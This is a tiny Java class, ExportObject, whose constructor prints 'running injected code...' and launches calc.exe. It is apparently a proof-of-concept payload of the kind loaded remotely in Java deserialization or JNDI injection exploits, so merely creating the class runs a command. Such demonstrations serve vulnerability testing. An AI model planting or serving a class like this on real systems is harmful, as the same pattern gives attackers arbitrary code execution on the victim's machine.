
public class ExportObject {
	public ExportObject() {
		try {
			System.out.println("running injected code...");
			Runtime.getRuntime().exec("calc.exe");
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}
